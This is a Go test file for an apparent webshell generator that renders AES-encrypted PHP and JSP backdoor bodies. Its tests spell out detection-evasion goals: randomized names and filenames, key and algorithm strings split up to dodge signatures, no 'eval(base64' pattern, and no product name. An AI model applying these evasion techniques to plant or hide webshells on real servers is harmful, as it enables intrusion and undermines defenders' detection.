package session

// shellgen_test.go 马体生成器测试:渲染完整性(无占位残留)、密钥嵌入、
// 变量名随机化(两份不同)、混淆档语义(密钥整串被拆分、无 eval(base64)
// 高特征形态)、PHP 模板 php -l 语法自检(环境无 php 则 skip)。

import (
	"encoding/base64"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

// Keep a structural check even on hosts without a PHP interpreter. The full
// rendered syntax tests below still run php -l when the interpreter is present.
func TestPHPTemplateVariableSigils(t *testing.T) {
	pattern := regexp.MustCompile(`\{\{\.V[A-Za-z]+\}\}`)
	for _, location := range pattern.FindAllStringIndex(phpEncTemplate, -1) {
		if location[0] == 0 || phpEncTemplate[location[0]-1] != '$' {
			t.Errorf("PHP variable placeholder lacks dollar prefix: %s", phpEncTemplate[location[0]:location[1]])
		}
	}
}

// phpLint 对生成的 PHP 马体做 php -l 语法检查;环境无 php 时 skip。
func phpLint(t *testing.T, content string) {
	t.Helper()
	php, err := exec.LookPath("php")
	if err != nil {
		t.Skip("环境无 php，跳过 php -l 语法检查（模板已人工核对）")
	}
	f := filepath.Join(t.TempDir(), "shell.php")
	if err := os.WriteFile(f, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	out, err := exec.Command(php, "-l", f).CombinedOutput()
	if err != nil {
		t.Fatalf("php -l 语法检查失败： %v\n%s", err, out)
	}
}

// TestGenerateShellPHP:PHP 马体渲染完整、密钥嵌入、占位清零、形态合规。
func TestGenerateShellPHP(t *testing.T) {
	gen, err := GenerateShell("php", false, "")
	if err != nil {
		t.Fatalf("GenerateShell: %v", err)
	}
	if gen.Lang != "phpenc" {
		t.Fatalf("lang = %q, want phpenc", gen.Lang)
	}
	if !strings.HasSuffix(gen.Filename, ".php") {
		t.Fatalf("filename = %q", gen.Filename)
	}
	if strings.Contains(gen.Content, "{{") || strings.Contains(gen.Content, "<no value>") {
		t.Fatal("模板占位未全部渲染")
	}
	if !strings.Contains(gen.Content, "'"+gen.KeyB64+"'") {
		t.Fatal("密钥未嵌入马体")
	}
	if len(gen.KeyDigest) != 16 {
		t.Fatalf("key_digest = %q", gen.KeyDigest)
	}
	// 形态底线:不做 eval(base64(...)) 高特征形态。
	if strings.Contains(gen.Content, "eval(base64") {
		t.Fatal("马体不应出现 eval(base64) 高特征形态")
	}
	// 双路径都在:GCM 与 CBC+HMAC。
	for _, want := range []string{"aes-256-gcm", "aes-256-cbc", "hash_hmac", "hash_equals"} {
		if !strings.Contains(gen.Content, want) {
			t.Fatalf("马体缺少 %s 路径", want)
		}
	}
	phpLint(t, gen.Content)
}

// TestGenerateShellRandomizedNames:两份马体变量/函数名随机化（静态特征最小化）。
func TestGenerateShellRandomizedNames(t *testing.T) {
	a, err := GenerateShell("php", false, "")
	if err != nil {
		t.Fatal(err)
	}
	b, err := GenerateShell("php", false, "")
	if err != nil {
		t.Fatal(err)
	}
	if a.Content == b.Content {
		t.Fatal("两份马体不应逐字节相同（密钥与变量名都应随机）")
	}
	if a.KeyB64 == b.KeyB64 {
		t.Fatal("两份马体密钥应独立随机")
	}
	if a.Filename == b.Filename {
		t.Fatal("建议文件名应随机化")
	}
}

// TestGenerateShellPHPObfuscated:混淆档——密钥整串被拆分，仍是合法 PHP。
func TestGenerateShellPHPObfuscated(t *testing.T) {
	gen, err := GenerateShell("php", true, "")
	if err != nil {
		t.Fatalf("GenerateShell: %v", err)
	}
	if strings.Contains(gen.Content, gen.KeyB64) {
		t.Fatal("混淆档应拆分密钥整串（整串常量特征是签名点）")
	}
	if strings.Contains(gen.Content, "'aes-256-gcm'") {
		t.Fatal("混淆档应拆分算法名整串")
	}
	if !strings.Contains(gen.Content, "'.'") {
		t.Fatal("混淆档应含字符串拼接")
	}
	if strings.Contains(gen.Content, "{{") {
		t.Fatal("模板占位未全部渲染")
	}
	if strings.Contains(gen.Content, "eval(base64") {
		t.Fatal("混淆不做 eval(base64) 高特征形态")
	}
	phpLint(t, gen.Content)
}

// TestGenerateShellJSP:JSP 马体渲染完整、密钥嵌入（JSP 模板人工核对，无本机
// 语法检查器）。
func TestGenerateShellJSP(t *testing.T) {
	gen, err := GenerateShell("jsp", false, "")
	if err != nil {
		t.Fatalf("GenerateShell: %v", err)
	}
	if gen.Lang != "jspenc" || !strings.HasSuffix(gen.Filename, ".jsp") {
		t.Fatalf("lang/filename = %q/%q", gen.Lang, gen.Filename)
	}
	if strings.Contains(gen.Content, "{{") || strings.Contains(gen.Content, "<no value>") {
		t.Fatal("模板占位未全部渲染")
	}
	if !strings.Contains(gen.Content, "\""+gen.KeyB64+"\"") {
		t.Fatal("密钥未嵌入马体")
	}
	if gen.Mode != "gcm" {
		t.Fatalf("mode = %q, want gcm", gen.Mode)
	}
	for _, want := range []string{"AES/GCM/NoPadding", "GCMParameterSpec", "SecureRandom"} {
		if !strings.Contains(gen.Content, want) {
			t.Fatalf("JSP 马体缺少 %s", want)
		}
	}
}

// TestGenerateShellBadLang:不支持的语言明确报错。
func TestGenerateShellBadLang(t *testing.T) {
	if _, err := GenerateShell("aspx", false, ""); err == nil {
		t.Fatal("aspx 加密马未实现，应报错")
	}
}

// TestGenerateShellNoProductFingerprint 批 7 P0-4:马体不含任何产品名字样
// (大小写不敏感);CBC 域分隔串随密钥派生,两份马体不同且与驱动侧
// encDomains 同一算法(平台侧仅凭密钥即可复现)。
func TestGenerateShellNoProductFingerprint(t *testing.T) {
	for _, lang := range []string{"php", "jsp"} {
		for _, obf := range []bool{false, true} {
			gen, err := GenerateShell(lang, obf, "")
			if err != nil {
				t.Fatalf("GenerateShell(%s, obf=%v): %v", lang, obf, err)
			}
			if strings.Contains(strings.ToLower(gen.Content), "artex") {
				t.Fatalf("%s(obf=%v)马体含产品名字样", lang, obf)
			}
		}
	}
	a, err := GenerateShell("php", false, "")
	if err != nil {
		t.Fatal(err)
	}
	b, err := GenerateShell("php", false, "")
	if err != nil {
		t.Fatal(err)
	}
	ka, _ := base64.StdEncoding.DecodeString(a.KeyB64)
	kb, _ := base64.StdEncoding.DecodeString(b.KeyB64)
	ea, ma := encDomains(ka)
	eb, mb := encDomains(kb)
	if ea == eb || ma == mb {
		t.Fatal("不同密钥派生的域分隔串应不同")
	}
	// 非混淆档:派生域串以整串字面量嵌进马体(与驱动侧共享同一值)。
	if !strings.Contains(a.Content, "'"+ma+"'") || !strings.Contains(a.Content, "'"+ea+"'") {
		t.Fatal("PHP 马体未嵌入派生域分隔串")
	}
}
